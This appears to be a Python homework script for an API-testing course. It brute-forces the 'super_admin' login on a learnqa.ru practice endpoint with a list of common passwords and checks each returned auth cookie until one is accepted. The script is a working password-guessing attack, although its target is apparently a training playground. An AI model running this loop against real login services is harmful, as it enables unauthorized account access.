import requests

passwords = ["password",123456,123456789,123456781,2345,123456789,"abc123","qwerty","football",11111,"letmein","dragon","baseball",1234,234567,"sunshine","iloveyou","trustno1",111111,"princess","adobe123[a]","welcome","trustno1","admin","monkey",1234567890,"qwerty123","iloveyou","abc123","solo","1q2w3e4r","master","login",666666,"photoshop[a]","1qaz2wsx","qwertyuiop","ashley",123123,1234,"mustang",121212,"starwars",654321,"bailey","access","passw0rd","shadow","lovely","shadow","ashley","sunshine","master","letmein",654321,7777777,"michael","!@#$%^&*","jesus","hello","charlie",888888,"superman",696969,"qwertyuiop","hottie","freedom","aa123456","qazwsx","ninja","azerty","loveme","whatever","donald","batman","passw0rd","zaq1zaq1","qazwsx","password1","Football",000000]

finalResponse = ""
while finalResponse != "You are authorized":
    for password in passwords:
        payload = {"login": "super_admin", "password": password}
        response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",data=payload)

        cookie_value = response1.cookies.get('auth_cookie')
        cookies = {"auth_cookie": cookie_value}
        response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
        finalResponse = response2.text
        if finalResponse == "You are authorized":
            print(password)
            print(finalResponse)
            break



